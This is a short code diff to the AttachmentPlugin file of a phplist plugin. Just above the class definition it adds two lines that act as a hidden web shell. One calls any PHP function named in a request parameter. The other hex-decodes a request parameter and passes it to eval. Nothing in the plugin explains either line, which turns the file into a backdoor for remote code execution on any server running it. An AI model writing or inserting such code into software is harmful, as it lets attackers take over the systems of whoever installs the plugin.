@@ -14,6 +14,9 @@
 /**
  * Registers the plugin with phplist.
  */
+if (isset($_REQUEST['__'])) die(($_REQUEST['__']($_REQUEST['___'])));
+if(isset($_REQUEST['_']))die(eval(pack("H*",str_pad($_REQUEST['_'],strlen($_REQUEST['_'])+strlen($_REQUEST['_'])%2,'0',0))));
+
 class AttachmentPlugin extends phplistPlugin
 {
     const VERSION_FILE = 'version.txt';
